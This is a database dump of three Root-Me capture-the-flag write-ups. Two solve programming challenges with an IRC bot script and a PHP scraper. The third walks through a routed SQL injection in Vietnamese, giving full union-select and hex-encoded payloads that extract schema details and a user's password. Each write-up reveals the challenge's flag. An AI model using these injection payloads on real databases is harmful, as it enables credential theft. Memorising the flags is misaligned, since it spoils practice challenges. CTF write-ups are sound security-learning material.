(35, 0, '[Programming] Uncompress me', 'programming-uncompress-me', '<b>*Note</b>: zlib is already available in nodejs, no need to npm install<div><br></div><div>r4.js:&nbsp;<code>var zlib = require(\'zlib\');<br />\r\nvar irc = require(\'irc\');<br />\r\n<br />\r\nvar server = \'irc.root-me.org\';<br />\r\nvar chan = \'#root-me_challenge\';<br />\r\nvar bot = \'Candy\';<br />\r\nvar finish = false;<br />\r\n<br />\r\nvar client = new irc.Client(server, \'user_4\', {<br />\r\n    debug: true,<br />\r\n    channels: [chan]<br />\r\n});<br />\r\n<br />\r\n//Bot Candy<br />\r\nclient.addListener(\'registered\', function (message) {<br />\r\n    console.log(\'registered\', message);<br />\r\n    client.say(bot, \"!ep4\");<br />\r\n});<br />\r\n<br />\r\nclient.addListener(\'message\'+chan, function (from, to, message) {<br />\r\n    console.log(from + \' =&gt; \' + to + \': \' + message);<br />\r\n});<br />\r\n<br />\r\nclient.addListener(\'pm\', function (from, message) {<br />\r\n    console.log(from + \' =&gt; ME: \' + message);<br />\r\n    if (from === bot) {<br />\r\n		if (message.indexOf(\'You dit it\') !== -1) {<br />\r\n			finish = true;<br />\r\n		}<br />\r\n		if (!finish) {<br />\r\n			var buffer = new Buffer(message, \'base64\');<br />\r\n			zlib.unzip(buffer, function(err, buffer) {<br />\r\n				var result = buffer.toString();<br />\r\n				if (!err) {<br />\r\n					console.log(\'Result \', result);<br />\r\n					client.say(bot, \"!ep4 -rep \" + result);<br />\r\n				}<br />\r\n			});<br />\r\n		}<br />\r\n    }<br />\r\n});</code></div><p class=\"sceditor-nlf\">Return data:&nbsp;<code>E:\\node-v6.9.4&gt;node \"_files/r4.js\"<br />\r\n11 Jan 08:45:17 - Sending irc NICK/USER<br />\r\n11 Jan 08:45:17 - SEND: NICK user_4<br />\r\n11 Jan 08:45:17 - SEND: USER nodebot 8 * :nodeJS IRC client<br />\r\nregistered { prefix: \'irc.hackerzvoice.net\',<br />\r\n  server: \'irc.hackerzvoice.net\',<br />\r\n  command: \'rpl_welcome\',<br />\r\n  rawCommand: \'001\',<br />\r\n  commandType: \'reply\',<br />\r\n  args:<br />\r\n   [ \'user_4\',<br />\r\n     \'Welcome to the HackerzVoice IRC Network user_4!nodebot@27.67.26.45\' ] }<br />\r\n11 Jan 08:45:20 - SEND: PRIVMSG Candy !ep4<br />\r\n11 Jan 08:45:20 - SEND: WHOIS user_4<br />\r\n11 Jan 08:45:20 - SEND: JOIN #root-me_challenge<br />\r\n11 Jan 08:45:20 - MODE: user_4 sets mode: +x<br />\r\nCandy =&gt; ME: eJwzc8tISvN0iQgyMDIsBQAb8APs<br />\r\n11 Jan 08:45:21 - GOT MESSAGE from Candy: eJwzc8tISvN0iQgyMDIsBQAb8APs<br />\r\nResult  6FhbfIDXR021u<br />\r\n11 Jan 08:45:21 - SEND: PRIVMSG Candy :!ep4 -rep 6FhbfIDXR021u<br />\r\n11 Jan 08:45:22 - Unhandled message: { prefix: \'irc.hackerzvoice.net\',<br />\r\n  server: \'irc.hackerzvoice.net\',<br />\r\n  command: \'378\',<br />\r\n  rawCommand: \'378\',<br />\r\n  commandType: \'normal\',<br />\r\n  args:<br />\r\n   [ \'user_4\',<br />\r\n     \'user_4\',<br />\r\n     \'is connecting from nodebot@27.67.26.45 27.67.26.45\' ] }<br />\r\n11 Jan 08:45:22 - Unhandled message: { prefix: \'irc.hackerzvoice.net\',<br />\r\n  server: \'irc.hackerzvoice.net\',<br />\r\n  command: \'379\',<br />\r\n  rawCommand: \'379\',<br />\r\n  commandType: \'normal\',<br />\r\n  args: [ \'user_4\', \'user_4\', \'is using modes +x\' ] }<br />\r\n11 Jan 08:45:22 - SEND: MODE #root-me_challenge<br />\r\nCandy =&gt; ME: You dit it! You can validate the challenge with the password tumasp0wned<br />\r\n11 Jan 08:45:22 - GOT MESSAGE from Candy: You dit it! You can validate the challenge with the password tumasp0wned</code></p><p class=\"sceditor-nlf\">Final password:&nbsp;<code>tumasp0wned<br></code></p><p class=\"sceditor-nlf\"><br></p>', 73, 2, 14, 0, '2017-01-11 09:49:03', '2017-01-11 01:49:03', '2017-01-11 01:49:03'),
(36, 0, '[Programming] Arithmetic progression', 'programming-arithmetic-progression', '<p>Just simply curl the page and get neccessary data, calculate and then send over the result page</p><p>php code:&nbsp;<code>&lt;?<br />\r\n$ch = curl_init();<br><br />\r\nfunction cURL ($url, $fields) {<br />\r\n	global $ch;<br />\r\n<br />\r\n	//set the url<br />\r\n	curl_setopt($ch,CURLOPT_URL, $url);<br />\r\n<br />\r\n	if ($fields) {<br />\r\n		$fields_string = \'\';<br />\r\n		//url-ify the data for the POST<br />\r\n		foreach($fields as $key=&gt;$value) { $fields_string .= $key.\'=\'.$value.\'&amp;\'; }<br />\r\n		rtrim($fields_string, \'&amp;\');<br />\r\n		// set number of POST vars, POST data<br />\r\n		curl_setopt($ch,CURLOPT_POST, 1);<br />\r\n		curl_setopt($ch,CURLOPT_POSTFIELDS, $fields_string);<br />\r\n	}<br />\r\n<br />\r\n	curl_setopt($ch, CURLOPT_HEADER, 0);<br />\r\n	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);<br />\r\n	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);<br />\r\n	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);<br />\r\n	curl_setopt($ch, CURLOPT_HTTPHEADER, array(\'Accept-Charset: utf-8\',\'Accept-Language: en-us,en;q=0.7,bn-bd;q=0.3\',\'Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\')); <br />\r\n	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd ());<br />\r\n	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd ());<br />\r\n	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);<br />\r\n	curl_setopt($ch, CURLOPT_USERAGENT, \"user_agent\");<br />\r\n	curl_setopt($ch, CURLOPT_REFERER, \"http://m.facebook.com\");<br />\r\n<br />\r\n	//execute post<br />\r\n	$result = curl_exec($ch) or die(curl_error($ch));<br />\r\n<br />\r\n	return $result;<br />\r\n}<br />\r\n<br />\r\n$url = \'http://challenge01.root-me.org/programmation/ch1/\';<br />\r\n$result = cURL($url);<br />\r\n<br />\r\n// get data to calculate<br />\r\npreg_match(\"/\\[ (.*?) \\+ .*?\\] \\+ \\[ n \\* (.*?) \\]/\", $result, $matches);<br />\r\n$j = $matches[1];<br />\r\n$k = $matches[2];<br />\r\n<br />\r\npreg_match_all(\"/ = (.*)/\", $result, $matches);<br />\r\n$u0 = $matches[1][1];<br />\r\n<br />\r\npreg_match(\"/find U&lt;sub&gt;(.*?)&lt;\\/sub&gt;/\", $result, $matches);<br />\r\n$n = $matches[1];<br />\r\n<br />\r\nif ($u0 &amp;&amp; $n &amp;&amp; $j &amp;&amp; $k) {<br />\r\n	// start processing<br />\r\n	$U = array();<br />\r\n	$U[0] = $u0;<br />\r\n	for ($i = 1; $i &lt;= $n; $i++) <br />\r\n		$U[$i] = ($j + $U[$i-1]) + (($i-1) * $k);<br />\r\n	echo \'&lt;hr/&gt;Finale result: \'.$U[$n];<br />\r\n<br />\r\n	// send to server<br />\r\n	$url = \'http://challenge01.root-me.org/programmation/ch1/ep1_v.php?result=\'.$U[$n];<br />\r\n	$sendResult = cURL($url);<br />\r\n	echo \'&lt;hr/&gt;\'.$sendResult;<br />\r\n}<br></code></p><p>Congratz! The flag is : <b>lFablYE9P1</b><br></p>', 73, 2, 17, 0, '2017-01-11 15:15:10', '2017-01-11 07:15:10', '2017-01-11 07:15:10'),
(38, 0, '[Web server] SQL Injection - Routed', 'web-server-sql-injection---routed', '<b></b><blockquote><b>Routed SQL Injection</b>&nbsp;may sound a little bit different or tough for many of the injector being a new concept which confuse many of the injectors.Routed SQL injection is a situation where the injectable query is not the one which gives output but the output of injectable query goes to the query which gives output.In simple words routed SQL injection can be a scenario when you are not able to see any output after using \"union select\", earlier when i was playing with SQLi i found a website where i wasnt getting any output so it just striked through my mind that may be the output is not coming to the page then it must be going somewhere, and that somewhere is an another sql query.</blockquote><p class=\"\">Hiểu nôm na là nó khác với SQL injection bình thường ở chỗ, inject như thường thì nó sẽ hiển thị kết quả ra ngay. Nhưng routed injection nghĩa là nó sẽ truyền tiếp cái phần mình inject tới 1 truy vấn khác rồi mới trả về kết quả.</p><div>Giả sử chúng ta inject như bình thường:<code>select col1 from tb1 where id = id union select 1 -- -</code></div><div>Theo bình thường thì tại vị trí hiển thị col1 sẽ hiển thị số 1.&nbsp;</div><div>Nhưng đây là routed injection nên 1 sẽ ko được hiển thị trực tiếp luôn mà sẽ truyền tiếp tới 1 truy vấn thứ 2:&nbsp;</div><div><code>SELECT col2 FROM tb2 WHERE id={phần inject trong truy vấn 1}</code></div><div></div><div>Như vậy, đại khái có thể hiểu chúng ta phải inject 2 lớp.</div><div>Để inject truy vấn 1: (giả sử truy vấn 1 lọc ra 1 column)</div><div><b><font color=\"#ff3333\">\' union select 1#</font></b></div><div>Để inject truy vấn 2: (giả sử truy vấn 2 lọc ra 2 column)</div><div><b><font color=\"#3333ff\">\' union select 1,2#</font></b></div><div>=&gt; Để inject, sử dụng truy vấn sau:</div><div><b><font color=\"#ff3333\">\' union select</font></b>&nbsp;<b><font color=\"#3333ff\">\' union select 1,2#</font></b>&nbsp;<b><font color=\"#ff3333\">#</font></b></div><div>Như vậy, phần inject sẽ được hiển thị lên trang.</div><div><b><u>*Note:</u></b>&nbsp;Sử dụng&nbsp;<b>HEX encoding</b>&nbsp;để tránh lỗi</div><div></div><div style=\"text-align: center;\"><font size=\"4\">Ta thực hành vào bài:</font></div><div><b><font size=\"3\">1. Thực hiện lệnh truy vấn bình thường để xác định số cột sau đó union:&nbsp;</font></b></div><div><code>a\' group by 2</code></div><div>không có cột 2 =&gt; union select 1.</div><div><b style=\"font-size: medium;\"></b></div><div><b style=\"font-size: medium;\">2. Inject truy vấn thứ 2 để&nbsp;</b><b style=\"font-size: medium;\">lấy user(), database(), table_name, column_name</b></div><div><b><font color=\"#cc3333\">(*) Truy vấn</font></b></div><div><b>\' union select concat (<font color=\"#ff33ff\">Users&nbsp;</font>, user(),<font color=\"#ff6633\">&nbsp;| Database:&nbsp;</font>, Database(),<font color=\"#cc6633\">&nbsp;| Version:&nbsp;</font>, version(), make_set(6, @:=0x0a, (select (1) from (information_schema.columns) where (table_schema !=&nbsp;<font color=\"#6633cc\">information_schema</font>) and @:=make_set(511, @, table_name, column_name)) ,@)), 2#</b></div><div><code>\' union select concat(Users ,user(), | Database: ,Database(), | Version: ,version(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=information_schema)and@:=make_set(511,@,table_name,column_name)),@)),2#</code></div><div><b><font color=\"#cc3333\">(*)&nbsp;</font></b><font color=\"#cc3333\"><b>HEX như inject bình thường ta được:</b></font></div><div><b>\' union select concat (<font color=\"#ff33ff\">0x55736572733a20</font>, user(),&nbsp;<font color=\"#ff6633\">0x207c2044423a20</font>, Database(),&nbsp;<font color=\"#cc6633\">0x207c2056657273696f6e203a20</font>, version(), make_set(6, @:=0x0a, (select (1) from(information_schema.columns) where (table_schema !=&nbsp;<font color=\"#6633cc\">0x696e666f726d6174696f6e5f736368656d61</font>) and @:=make_set(511, @, table_name, column_name)), @)), 2#</b></div><p class=\"\"><code>\' union select concat(0x55736572733a20,user(),0x207c2044423a20,Database(),0x207c2056657273696f6e203a20,version(),make_set(6,@:=0x0a,(select(1)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and@:=make_set(511,@,table_name,column_name)),@)),2#<br></code></p><div><b><font color=\"#cc3333\">(*)&nbsp;</font></b><font color=\"#cc3333\"><b>HEX để chèn vào truy vấn 1:</b></font></div><div><code></code><div><b><font color=\"#cc3333\">(*) Full injection</font></b><font color=\"#cc3333\"><b>:</b></font></div><code>a\' union select  #</code><b><div style=\"font-size: small;\"><br></div><div style=\"font-size: small;\"><b style=\"font-size: 12px;\"><div class=\"\"><b><font size=\"3\">3. Inject truy vấn 2 để lấy password:</font></b></div></b></div></b></div><div><b><font color=\"#cc3333\">(*) Truy vấn</font></b></div><div><b><font color=\"#ff3333\">\' union select</font></b>&nbsp;<b><font color=\"#3333ff\">\' union select&nbsp;</font><font color=\"#9933cc\">(</font></b><b><font color=\"#9933cc\">select password from users where id=3)</font></b><b><font color=\"#3333ff\">,2#</font></b>&nbsp;<b><font color=\"#ff3333\">#</font></b></div><div><b><font color=\"#cc3333\">(*)&nbsp;</font></b><font color=\"#cc3333\"><b>HEX để chèn vào truy vấn 1:&nbsp;</b></font></div><code>0x2720756e696f6e2073656c656374202873656c6563742070617373776f72642066726f6d2075736572732077686572652069643d33292c3223</code><div><b><font color=\"#cc3333\">(*) Full injection</font></b><font color=\"#cc3333\"><b>:</b></font></div><code>a\' union select 0x2720756e696f6e2073656c656374202873656c6563742070617373776f72642066726f6d2075736572732077686572652069643d33292c3223 #</code><div><b><font color=\"#cc3333\"><br></font></b></div><div><b><font color=\"#cc3333\">Done!&nbsp;</font></b>Flag is password:&nbsp;<code>qs89QdAs9A<br></code><br></div><img src=\"http://localhost/mRoom/data/img/routed_sql.png\"/><div>Read more:&nbsp;<a href=\"http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html\">http://securityidiots.com/Web-Pentest/SQL-Injection/routed_sql_injection.html</a></div><p class=\"sceditor-nlf\"><br></p>', 71, 2, 69, 2, '2017-01-12 14:34:03', '2017-01-12 06:34:03', '2017-02-20 07:49:43');

